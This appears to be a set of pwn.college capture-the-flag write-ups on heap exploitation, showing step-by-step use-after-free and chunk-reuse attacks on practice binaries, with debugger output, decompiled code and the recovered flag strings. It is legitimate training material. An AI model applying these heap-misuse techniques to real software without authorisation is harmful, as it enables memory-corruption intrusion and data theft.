---
custom_edit_url: null
sidebar_position: 3
slug: /pwn-college/program-security/dynamic-allocator-misuse
---

## Freebie (Easy)

```
hacker@dynamic-allocator-misuse~freebie-easy:~$ /challenge/freebie-easy 
###
### Welcome to /challenge/freebie-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): 
```

The program uses a memory space of 292 bytes to read the flag.

```
[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(292)
[*] flag_buffer = 0x5633693962c0
[*] read the flag!
```

But it SEGFAULTs when we try the `puts` command.

```
[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: Segmentation fault
```

### Use-After-Free

We can leverage a UAF vulnerability here, where we allocate 292 bytes of memory using `malloc`, and then free it using the `free` command.
It is important that we allocate the name number of bytes that the `read_flag` function uses, otherwise it will use another Tcache bin.

#### Tcache Binning
The heap allocator (GLIBC) doesn't just throw all freed memory into one big pile. It organizes freed chunks into "bins" based on their size.
- A chunk of `128` bytes goes into Bin `#7`.
- A chunk of `292` bytes goes into Bin `#17`.

When the program calls `malloc(N)`, the allocator only looks in the bin that matches size `N`.

We then use `read_flag` to instruct the program to read the flag next it will read it to the same location where the first allocated memory was, because that pointer is not cleared.
Next, when we use `puts`, the program will print the data pointed to by the original pointer. However, since we read the flag to that location, the flag will be printed.

### Exploit

```
hacker@dynamic-allocator-misuse~freebie-easy:~$ /challenge/freebie-easy 
###
### Welcome to /challenge/freebie-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 292

[*] allocations[0] = malloc(292)
[*] allocations[0] = 0x5c1c841ef2c0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #17     | SIZE: 281 - 296        | COUNT: 1     | HEAD: 0x5c1c841ef2c0       | KEY: 0x5c1c841ef010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5c1c841ef2c0      | 0                   | 0x131 (P)                    | (nil)               | 0x5c1c841ef010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(292)
[*] flag_buffer = 0x5c1c841ef2c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{84MQn7Xg8iltuVV7AxkYMfwzHrQ.0VM3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Freebie (Hard)

```
hacker@dynamic-allocator-misuse~freebie-hard:~$ /challenge/freebie-hard 
###
### Welcome to /challenge/freebie-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

This time the program does not tell us how many bytes the `read_flag` function is allocating. We need to know this so that we can use the same number of bytes in our `malloc`.

- [ ] Size allocated for `read_flag`

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010f0  __cxa_finalize@plt
0x0000000000001100  free@plt
0x0000000000001110  putchar@plt
0x0000000000001120  puts@plt
0x0000000000001130  __stack_chk_fail@plt
0x0000000000001140  printf@plt
0x0000000000001150  read@plt
0x0000000000001160  strcmp@plt
0x0000000000001170  malloc@plt
0x0000000000001180  setvbuf@plt
0x0000000000001190  open@plt
0x00000000000011a0  atoi@plt
0x00000000000011b0  __isoc99_scanf@plt
0x00000000000011c0  _start
0x00000000000011f0  deregister_tm_clones
0x0000000000001220  register_tm_clones
0x0000000000001260  __do_global_dtors_aux
0x00000000000012a0  frame_dummy
0x00000000000012a9  main
0x00000000000015b0  __libc_csu_init
0x0000000000001620  __libc_csu_fini
0x0000000000001628  _fini
```

#### `main()`

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000000012a9 <+0>:     endbr64
   0x00000000000012ad <+4>:     push   rbp
   0x00000000000012ae <+5>:     mov    rbp,rsp
   0x00000000000012b1 <+8>:     sub    rsp,0xe0
   0x00000000000012b8 <+15>:    mov    DWORD PTR [rbp-0xc4],edi
   0x00000000000012be <+21>:    mov    QWORD PTR [rbp-0xd0],rsi
   0x00000000000012c5 <+28>:    mov    QWORD PTR [rbp-0xd8],rdx
   0x00000000000012cc <+35>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000012d5 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000012d9 <+48>:    xor    eax,eax
   0x00000000000012db <+50>:    mov    rax,QWORD PTR [rip+0x2d3e]        # 0x4020 <stdin@@GLIBC_2.2.5>
   0x00000000000012e2 <+57>:    mov    ecx,0x0
   0x00000000000012e7 <+62>:    mov    edx,0x2
   0x00000000000012ec <+67>:    mov    esi,0x0
   0x00000000000012f1 <+72>:    mov    rdi,rax
   0x00000000000012f4 <+75>:    call   0x1180 <setvbuf@plt>
   0x00000000000012f9 <+80>:    mov    rax,QWORD PTR [rip+0x2d10]        # 0x4010 <stdout@@GLIBC_2.2.5>
   0x0000000000001300 <+87>:    mov    ecx,0x1
   0x0000000000001305 <+92>:    mov    edx,0x2
   0x000000000000130a <+97>:    mov    esi,0x0
   0x000000000000130f <+102>:   mov    rdi,rax
   0x0000000000001312 <+105>:   call   0x1180 <setvbuf@plt>
   0x0000000000001317 <+110>:   lea    rdi,[rip+0xcea]        # 0x2008
   0x000000000000131e <+117>:   call   0x1120 <puts@plt>
   0x0000000000001323 <+122>:   mov    rax,QWORD PTR [rbp-0xd0]
   0x000000000000132a <+129>:   mov    rax,QWORD PTR [rax]
   0x000000000000132d <+132>:   mov    rsi,rax
   0x0000000000001330 <+135>:   lea    rdi,[rip+0xcd5]        # 0x200c
   0x0000000000001337 <+142>:   mov    eax,0x0
   0x000000000000133c <+147>:   call   0x1140 <printf@plt>
   0x0000000000001341 <+152>:   lea    rdi,[rip+0xcc0]        # 0x2008
   0x0000000000001348 <+159>:   call   0x1120 <puts@plt>
   0x000000000000134d <+164>:   mov    edi,0xa
   0x0000000000001352 <+169>:   call   0x1110 <putchar@plt>
   0x0000000000001357 <+174>:   mov    QWORD PTR [rbp-0x98],0x0
   0x0000000000001362 <+185>:   mov    QWORD PTR [rbp-0xa0],0x106
   0x000000000000136d <+196>:   lea    rdi,[rip+0xcac]        # 0x2020
   0x0000000000001374 <+203>:   call   0x1120 <puts@plt>
   0x0000000000001379 <+208>:   lea    rdi,[rip+0xca8]        # 0x2028
   0x0000000000001380 <+215>:   mov    eax,0x0
   0x0000000000001385 <+220>:   call   0x1140 <printf@plt>
   0x000000000000138a <+225>:   lea    rax,[rbp-0x90]
   0x0000000000001391 <+232>:   mov    rsi,rax
   0x0000000000001394 <+235>:   lea    rdi,[rip+0xcbe]        # 0x2059
   0x000000000000139b <+242>:   mov    eax,0x0
   0x00000000000013a0 <+247>:   call   0x11b0 <__isoc99_scanf@plt>
   0x00000000000013a5 <+252>:   lea    rdi,[rip+0xc74]        # 0x2020
   0x00000000000013ac <+259>:   call   0x1120 <puts@plt>
   0x00000000000013b1 <+264>:   lea    rax,[rbp-0x90]
   0x00000000000013b8 <+271>:   lea    rsi,[rip+0xca0]        # 0x205f
   0x00000000000013bf <+278>:   mov    rdi,rax
   0x00000000000013c2 <+281>:   call   0x1160 <strcmp@plt>
   0x00000000000013c7 <+286>:   test   eax,eax
   0x00000000000013c9 <+288>:   jne    0x1446 <main+413>
   0x00000000000013cb <+290>:   mov    DWORD PTR [rbp-0xb0],0x0
   0x00000000000013d5 <+300>:   lea    rdi,[rip+0xc8a]        # 0x2066
   0x00000000000013dc <+307>:   mov    eax,0x0
   0x00000000000013e1 <+312>:   call   0x1140 <printf@plt>
   0x00000000000013e6 <+317>:   lea    rax,[rbp-0x90]
   0x00000000000013ed <+324>:   mov    rsi,rax
   0x00000000000013f0 <+327>:   lea    rdi,[rip+0xc62]        # 0x2059
   0x00000000000013f7 <+334>:   mov    eax,0x0
   0x00000000000013fc <+339>:   call   0x11b0 <__isoc99_scanf@plt>
   0x0000000000001401 <+344>:   lea    rdi,[rip+0xc18]        # 0x2020
   0x0000000000001408 <+351>:   call   0x1120 <puts@plt>
   0x000000000000140d <+356>:   lea    rax,[rbp-0x90]
   0x0000000000001414 <+363>:   mov    rdi,rax
   0x0000000000001417 <+366>:   call   0x11a0 <atoi@plt>
   0x000000000000141c <+371>:   mov    DWORD PTR [rbp-0xac],eax
   0x0000000000001422 <+377>:   mov    eax,DWORD PTR [rbp-0xac]
   0x0000000000001428 <+383>:   mov    rdi,rax
   0x000000000000142b <+386>:   call   0x1170 <malloc@plt>
   0x0000000000001430 <+391>:   mov    rdx,rax
   0x0000000000001433 <+394>:   mov    eax,DWORD PTR [rbp-0xb0]
   0x0000000000001439 <+400>:   mov    QWORD PTR [rbp+rax*8-0x98],rdx
   0x0000000000001441 <+408>:   jmp    0x136d <main+196>
   0x0000000000001446 <+413>:   lea    rax,[rbp-0x90]
   0x000000000000144d <+420>:   lea    rsi,[rip+0xc19]        # 0x206d
   0x0000000000001454 <+427>:   mov    rdi,rax
   0x0000000000001457 <+430>:   call   0x1160 <strcmp@plt>
   0x000000000000145c <+435>:   test   eax,eax
   0x000000000000145e <+437>:   jne    0x1485 <main+476>
   0x0000000000001460 <+439>:   mov    DWORD PTR [rbp-0xb0],0x0
   0x000000000000146a <+449>:   mov    eax,DWORD PTR [rbp-0xb0]
   0x0000000000001470 <+455>:   mov    rax,QWORD PTR [rbp+rax*8-0x98]
   0x0000000000001478 <+463>:   mov    rdi,rax
   0x000000000000147b <+466>:   call   0x1100 <free@plt>
   0x0000000000001480 <+471>:   jmp    0x136d <main+196>
   0x0000000000001485 <+476>:   lea    rax,[rbp-0x90]
   0x000000000000148c <+483>:   lea    rsi,[rip+0xbdf]        # 0x2072
   0x0000000000001493 <+490>:   mov    rdi,rax
   0x0000000000001496 <+493>:   call   0x1160 <strcmp@plt>
   0x000000000000149b <+498>:   test   eax,eax
   0x000000000000149d <+500>:   jne    0x14d5 <main+556>
   0x000000000000149f <+502>:   mov    DWORD PTR [rbp-0xb0],0x0
   0x00000000000014a9 <+512>:   lea    rdi,[rip+0xbc7]        # 0x2077
   0x00000000000014b0 <+519>:   mov    eax,0x0
   0x00000000000014b5 <+524>:   call   0x1140 <printf@plt>
   0x00000000000014ba <+529>:   mov    eax,DWORD PTR [rbp-0xb0]
   0x00000000000014c0 <+535>:   mov    rax,QWORD PTR [rbp+rax*8-0x98]
   0x00000000000014c8 <+543>:   mov    rdi,rax
   0x00000000000014cb <+546>:   call   0x1120 <puts@plt>
   0x00000000000014d0 <+551>:   jmp    0x136d <main+196>
   0x00000000000014d5 <+556>:   lea    rax,[rbp-0x90]
   0x00000000000014dc <+563>:   lea    rsi,[rip+0xb9b]        # 0x207e
   0x00000000000014e3 <+570>:   mov    rdi,rax
   0x00000000000014e6 <+573>:   call   0x1160 <strcmp@plt>
   0x00000000000014eb <+578>:   test   eax,eax
   0x00000000000014ed <+580>:   jne    0x1554 <main+683>
   0x00000000000014ef <+582>:   mov    DWORD PTR [rbp-0xb4],0x0
   0x00000000000014f9 <+592>:   jmp    0x1518 <main+623>
   0x00000000000014fb <+594>:   mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000001502 <+601>:   mov    rdi,rax
   0x0000000000001505 <+604>:   call   0x1170 <malloc@plt>
   0x000000000000150a <+609>:   mov    QWORD PTR [rbp-0xa8],rax
   0x0000000000001511 <+616>:   add    DWORD PTR [rbp-0xb4],0x1
   0x0000000000001518 <+623>:   cmp    DWORD PTR [rbp-0xb4],0x0
   0x000000000000151f <+630>:   jle    0x14fb <main+594>
   0x0000000000001521 <+632>:   mov    esi,0x0
   0x0000000000001526 <+637>:   lea    rdi,[rip+0xb5b]        # 0x2088
   0x000000000000152d <+644>:   mov    eax,0x0
   0x0000000000001532 <+649>:   call   0x1190 <open@plt>
   0x0000000000001537 <+654>:   mov    ecx,eax
   0x0000000000001539 <+656>:   mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000001540 <+663>:   mov    edx,0x80
   0x0000000000001545 <+668>:   mov    rsi,rax
   0x0000000000001548 <+671>:   mov    edi,ecx
   0x000000000000154a <+673>:   call   0x1150 <read@plt>
   0x000000000000154f <+678>:   jmp    0x136d <main+196>
   0x0000000000001554 <+683>:   lea    rax,[rbp-0x90]
   0x000000000000155b <+690>:   lea    rsi,[rip+0xb2c]        # 0x208e
   0x0000000000001562 <+697>:   mov    rdi,rax
   0x0000000000001565 <+700>:   call   0x1160 <strcmp@plt>
   0x000000000000156a <+705>:   test   eax,eax
   0x000000000000156c <+707>:   je     0x157c <main+723>
   0x000000000000156e <+709>:   lea    rdi,[rip+0xb1e]        # 0x2093
   0x0000000000001575 <+716>:   call   0x1120 <puts@plt>
   0x000000000000157a <+721>:   jmp    0x157d <main+724>
   0x000000000000157c <+723>:   nop
   0x000000000000157d <+724>:   lea    rdi,[rip+0xb24]        # 0x20a8
   0x0000000000001584 <+731>:   call   0x1120 <puts@plt>
   0x0000000000001589 <+736>:   mov    eax,0x0
   0x000000000000158e <+741>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000001592 <+745>:   xor    rcx,QWORD PTR fs:0x28
   0x000000000000159b <+754>:   je     0x15a2 <main+761>
   0x000000000000159d <+756>:   call   0x1130 <__stack_chk_fail@plt>
   0x00000000000015a2 <+761>:   leave
   0x00000000000015a3 <+762>:   ret
End of assembler dump.
```

The second `malloc`, at `main+604` is what is called when we use the `read_flag` command. We can tell that it is the second one and not the first call to `malloc` at `main+386`, because the first one takes another input, which is the size of memory to be allocated. So the first call to `malloc` happens when we use the `malloc` command.

Let's put a breakpoint and run.

```
pwndbg> break *(main+604)
Breakpoint 1 at 0x1505
```

```
pwndbg> run
Starting program: /challenge/freebie-hard 
###
### Welcome to /challenge/freebie-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag


Breakpoint 1, 0x00005eab712ba505 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────
 RAX  0x106
 RBX  0x5eab712ba5b0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7b84ab44a297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x106
 RSI  0x5eab712bb07e ◂— 'read_flag'
 R8   1
 R9   0x7ffffff8
 R10  0x7fffffff
 R11  0x246
 R12  0x5eab712ba1c0 (_start) ◂— endbr64 
 R13  0x7ffc52383440 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffc52383350 ◂— 0
 RSP  0x7ffc52383270 ◂— 0
 RIP  0x5eab712ba505 (main+604) ◂— call malloc@plt
───────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────
 ► 0x5eab712ba505 <main+604>    call   malloc@plt                  <malloc@plt>
        size: 0x106
 
   0x5eab712ba50a <main+609>    mov    qword ptr [rbp - 0xa8], rax
   0x5eab712ba511 <main+616>    add    dword ptr [rbp - 0xb4], 1
   0x5eab712ba518 <main+623>    cmp    dword ptr [rbp - 0xb4], 0
   0x5eab712ba51f <main+630>    jle    main+594                    <main+594>
 
   0x5eab712ba521 <main+632>    mov    esi, 0                 ESI => 0
   0x5eab712ba526 <main+637>    lea    rdi, [rip + 0xb5b]     RDI => 0x5eab712bb088 ◂— 0x75710067616c662f /* '/flag' */
   0x5eab712ba52d <main+644>    mov    eax, 0                 EAX => 0
   0x5eab712ba532 <main+649>    call   open@plt                    <open@plt>
 
   0x5eab712ba537 <main+654>    mov    ecx, eax
   0x5eab712ba539 <main+656>    mov    rax, qword ptr [rbp - 0xa8]
────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc52383270 ◂— 0
01:0008│-0d8 0x7ffc52383278 —▸ 0x7ffc52383458 —▸ 0x7ffc52384691 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-0d0 0x7ffc52383280 —▸ 0x7ffc52383448 —▸ 0x7ffc52384679 ◂— '/challenge/freebie-hard'
03:0018│-0c8 0x7ffc52383288 ◂— 0x100000000
04:0020│-0c0 0x7ffc52383290 ◂— 0
... ↓        3 skipped
──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5eab712ba505 main+604
   1   0x7b84ab360083 __libc_start_main+243
   2   0x5eab712ba1ee _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Size allocated for `read_flag`: `262`

### Exploit

```
hacker@dynamic-allocator-misuse~freebie-hard:~$ /challenge/freebie-hard 
###
### Welcome to /challenge/freebie-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 262


[*] Function (malloc/free/puts/read_flag/quit): free


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): puts

Data: pwn.college{I2KyXNxk50mkShkCYeSWWeQnub9.0lM3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Freebin Feint (Easy)

```
hacker@dynamic-allocator-misuse~freebin-feint-easy:~$ /challenge/freebin-feint-easy 
###
### Welcome to /challenge/freebin-feint-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(991)
[*] flag_buffer = 0x582868eee2c0
[*] read the flag!
```

This challenge is very similar to the previous one, only difference being that the size of the `flag_buffer` is pretty arbitrary this time. So we have to allocate the same size when we use `malloc`.

### Exploit

```
hacker@dynamic-allocator-misuse~freebin-feint-easy:~$ /challenge/freebin-feint-easy 
###
### Welcome to /challenge/freebin-feint-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(991)
[*] flag_buffer = 0x582868eee2c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 991

[*] allocations[0] = malloc(991)
[*] allocations[0] = 0x582868eee6b0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #61     | SIZE: 985 - 1000       | COUNT: 1     | HEAD: 0x582868eee6b0       | KEY: 0x582868eee010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x582868eee6b0      | 0                   | 0x3f1 (P)                    | (nil)               | 0x582868eee010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(991)
[*] flag_buffer = 0x582868eee6b0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{YmZfwVA6aurOwPF9E1iE4IdM40I.01M3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Freebin Feint (Hard)

```
hacker@dynamic-allocator-misuse~freebin-feint-hard:~$ /challenge/freebin-feint-hard 
###
### Welcome to /challenge/freebin-feint-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x6241860a12a0

[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

Again, the `flag_buffer` is some arbitrary size.
In order to solve this challenge, we have to leverage Remaindering.

### Leveraging the Unsorted bin

Memory managers handle splitting large memory blocks from the "top chunk" (the largest free block) to satisfy smaller allocation requests, creating a smaller "remainder" block that stays available in the heap.

This only happens if the Unsorted bin is used instead of Tcache to allocated memory. For that we have to allocate a chunk of size greater than 1032 bytes, as Tcache only handles memory allocation upto 1032 bytes.

So, if we allocate a large enough space, then free it, and then call the `read_flag` command, we would not have to worry about the size of `flag_buffer` because it will be split and used from our large buffer allocation.

### Exploit

```
hacker@dynamic-allocator-misuse~freebin-feint-hard:~$ /challenge/freebin-feint-hard 
###
### Welcome to /challenge/freebin-feint-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 5000

[*] allocations[0] = 0x5618c504f2a0

[*] Function (malloc/free/puts/read_flag/quit): free


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x5618c504f2a0

[*] Function (malloc/free/puts/read_flag/quit): puts

Data: pwn.college{su9bnqD-UlklEnJ8xjHEtaBKtSJ.0FN3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Free Flag Fumble (Easy)

```
hacker@dynamic-allocator-misuse~free-flag-fumble-easy:/$ /challenge/free-flag-fumble-easy 
###
### Welcome to /challenge/free-flag-fumble-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x59c50bb2c2c0
[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x59c50bb2c4b0
[*] read the flag!
```

This time the `read_flag` function reads the flag twice into buffers of size `480` bytes.

### Exploit

```
hacker@dynamic-allocator-misuse~free-flag-fumble-easy:/$ /challenge/free-flag-fumble-easy 
###
### Welcome to /challenge/free-flag-fumble-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c2c0
[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c4b0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 480

[*] allocations[0] = malloc(480)
[*] allocations[0] = 0x562a9e54c6a0

[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 480

[*] allocations[1] = malloc(480)
[*] allocations[1] = 0x562a9e54c890

[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #29     | SIZE: 473 - 488        | COUNT: 1     | HEAD: 0x562a9e54c6a0       | KEY: 0x562a9e54c010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x562a9e54c6a0      | 0                   | 0x1f1 (P)                    | (nil)               | 0x562a9e54c010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1

[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #29     | SIZE: 473 - 488        | COUNT: 2     | HEAD: 0x562a9e54c890       | KEY: 0x562a9e54c010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x562a9e54c890      | 0                   | 0x1f1 (P)                    | 0x562a9e54c6a0      | 0x562a9e54c010      |
| 0x562a9e54c6a0      | 0                   | 0x1f1 (P)                    | (nil)               | 0x562a9e54c010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c890
[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c6a0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

[*] puts(allocations[0])
Data: pwn.college{4d96a3J7Ce0XBHbjqikTX4-jo2e.0VN3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Free Flag Fumble (Hard)

```
hacker@dynamic-allocator-misuse~free-flag-fumble-hard:/$ /challenge/free-flag-fumble-hard 
###
### Welcome to /challenge/free-flag-fumble-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag
```

As always, the hard challenge does not tell us the size of the buffers into which the flag was read.

### Binary Analysis

```c title="/challenge/free-flag-fumble-hard :: main()"
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+24h] [rbp-12Ch]
  unsigned int index_1; // [rsp+28h] [rbp-128h]
  unsigned int index; // [rsp+28h] [rbp-128h]
  unsigned int v8; // [rsp+28h] [rbp-128h]
  unsigned int size; // [rsp+2Ch] [rbp-124h]
  void *size_4; // [rsp+30h] [rbp-120h]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts(byte_2020);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          if ( strcmp(choice, "malloc") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          index_1 = atoi(choice);
          if ( index_1 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 60u, "main");
          printf("Size: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          size = atoi(choice);
          ptr[index_1] = malloc(size);
        }
        if ( strcmp(choice, "free") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_2020);
        index = atoi(choice);
        if ( index > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 76u, "main");
        free(ptr[index]);
      }
      if ( strcmp(choice, "puts") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_2020);
      v8 = atoi(choice);
      if ( v8 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 88u, "main");
      printf("Data: ");
      puts((const char *)ptr[v8]);
    }
    if ( strcmp(choice, "read_flag") )
      break;
    for ( i = 0; i <= 1; ++i )
      size_4 = malloc(957uLL);
    v3 = open("/flag", 0);
    read(v3, size_4, 128uLL);
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

We can see that on making the `read_flag` choice, the program allocates two buffers of size `957` bytes.

### Exploit

```
hacker@dynamic-allocator-misuse~free-flag-fumble-hard:~$ /challenge/free-flag-fumble-hard 
###
### Welcome to /challenge/free-flag-fumble-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 957


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 957


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

Data: pwn.college{8Wq-xUWLolH-kpTT9mLLl4qgFmM.0lN3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```